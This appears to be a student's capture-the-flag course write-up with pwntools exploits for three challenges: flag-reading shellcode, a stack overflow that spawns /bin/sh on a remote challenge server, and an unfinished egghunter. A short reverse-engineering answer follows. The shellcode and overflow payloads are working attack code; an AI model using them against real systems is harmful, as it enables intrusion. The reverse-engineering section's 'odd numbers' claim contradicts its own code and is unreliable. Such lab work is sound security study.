==================================================================
simple
==================================================================
Flag: FLAG{eyJhbGciOiJIUzI1NiJ9.eyJjaGFsIjoid2FyMy1zaW1wbGUiLCJpcCI6IjEwMS4xNjQuMzMuMjE5Iiwic2Vzc2lvbiI6ImMxMmY5NWJmLTdjZTYtNDVjYS05OTE2LTc3MDRjNmUzYTEyZCJ9.GUiTuOHNO9HRJmiDq7E0pl5Bc3v4KeBZFVs8XaL0yv4}
------------------------------------------------------------------
General overview
1. The first exercise as usual was pretty simple, all I needed to do was was read enough bytes from fd 1000 to capture the entire flag, then write those bytes to stdout. This was essentially just the third lab exercise.
------------------------------------------------------------------
Program used

	#!/usr/bin/python

	from pwn import *

	p = remote("plsdonthaq.me", 3001)
	# p = process("./simple")

	p.recvuntil("shellcode:")

	payload = asm("""

	    mov eax, 0x3
	    mov ebx, 0x3e8
	    mov ecx, esp
	    mov edx, 0x3e8

	    int 0x80

	    mov edx, eax
	    mov eax, 0x4
	    mov ebx, 0x1
	    mov ecx, esp

	    int 0x80

	    """)

	p.sendline(payload)

	p.interactive()

==================================================================



==================================================================
shellz
==================================================================
Flag: FLAG{eyJhbGciOiJIUzI1NiJ9.eyJjaGFsIjoid2FyMy1zaGVsbHoiLCJpcCI6IjEwMS4xNjQuMzMuMjE5Iiwic2Vzc2lvbiI6IjZmNTZhOTQzLTgyNDMtNDZlNC1iZWNkLWJlMTJlYmY2ODczYyJ9.f8_kl6w1ffVguqxeIfRq9YdeKDuV57Ymuulb4BEHypI}
------------------------------------------------------------------
General overview
This exercise was a bit more difficult than the previous, but not terribly. I took it in three stages
	1.I first found out how many bytes I needed to write (how many nops) in order to overflow the return address (luckily binary-ninja helpfully told me exactly what this offset was)

	2. I then replaced the tail-end of these nops with the address we were given, so that it would overwrite the return address.

	3a. Lastly, the actually difficult part, injecting the shellcode. For this I used the same shellcode from the labs, and (initially) just injected this right before the return address, and removed 0x22 nops (I used len() on just the asm() to find the length of the payload without the nops).

	3b. I realized this wasn't working and that it was entirely possibly this was due to the addresses the code was running in, was those of the registers it was using. So I decided to just push it back 0x100 bytes and put 0x100 nops after the shellcode, it luckily worked.
------------------------------------------------------------------
Program used

	#!/usr/bin/python

	from pwn import *

	#p = process("./shellz")
	p = remote("plsdonthaq.me", 3002)

	p.recvuntil("address:")

	address = p.recvuntil("\n", drop=True)
	address = int(address, 16)

	# for shell
	# "/bin/sh\x00" = 2f 62 69 6e 2f 73 68 00

	payload = b""
	payload += b"\x90" * (0x2008 - 0x22 -0x100) # 0x100 bytes for the nops before the
						    # address, 0x22 for the actual payload

	payload += asm("""

	    push 0x0068732f
	    push 0x6e69622f

	    mov ebx, esp
	    mov eax, 0xb
	    mov ecx, 0
	    mov edx, 0
	    mov esi, 0

	    int 0x80
	    
	    """)

	payload += b"\x90" * (0x100 + 0) # it didn't seem to work when I didn't include the +0
	payload += p32(address)

	p.sendline(payload)

	p.interactive()

==================================================================



==================================================================
find-me
==================================================================
Flag:
------------------------------------------------------------------
General overview

The egghunter unfortunately eluded me, so I wasn't able to get the flag. My understanding of the program was that the smallbuf was the egghunter, it would loop through all of the memory (I assumed just the stack but this may have been where I went wrong), searching for the egg, in my case 0x13371337. When it found the egg it would jump to it, otherwise it would search increment the address by one and check that.

I went through two different iterations of my egghunter, the first one was based on what I found online, using scasd storing the egg in eax and the value stored in each address in edi, but that didn't work (I included it at the end of the "program used" section in comments). After this I went for what I asumed was the simpler approach which was just loading in the address and using cmp on the two values, but this didn't work either.

I'm pretty annoyed I wasn't to complete this challenge.

------------------------------------------------------------------
Program used

	#!/usr/bin/python

	from pwn import *

	p = process("./find-me")
	#p = remote("plsdonthaq.me", 3003)

	p.recvuntil("new stack ")
	address = p.recvuntil("\n", drop=True)
	address = int(address, 16)

	p.recvuntil("smallbuf shellcode")

	payload = asm("""

	    xor ecx, ecx
	    lea ecx, [esp]

	inc:
	    inc ecx

	test:
	    mov eax, ecx

	    cmp eax, 0x13371337
	    jnz inc

	    jmp ecx

	    """)

	p.sendline(payload)

	p.recvuntil("bigbuf shellcode:")

	payload = asm("""

	    push 0x13371337
	    push 0x13371337

	    mov eax, 0x3
	    mov ebx, 0x3e8
	    mov ecx, esp
	    mov edx, 0x3e8

	    int 0x80

	    mov edx, eax
	    mov eax, 0x4
	    mov ebx, 0x1
	    mov ecx, esp

	    int 0x80
	    
	    """)

	p.sendline(payload)

	p.interactive()

	# 	lea ecx, [esp]
	# 
	# inc:
	# 	inc ecx
	#
	# test:
	# 	mov eax, 0x13371337
	#	mov edi, ecx
	#
	#	scasd
	#	jnz inc
	#
	#	scasd
	#	jnz inc
	#
	#	jmp edi

==================================================================



==================================================================
reverse engineering
==================================================================
General overview

It seemed to me that this program simply looped from 0 to 10 printing every odd number.

------------------------------------------------------------------
Program used

	int main(int argc, char *argv[]) {

	    var_14 = 0;

	    while (var_14 <= 9) {

		/* if var_14 is odd, print it */
		if (!(var_14 & 0x1)) {
		    printf("%d", var_14);
		}

		var_14++;
	    }

	    return 1;
	}

==================================================================
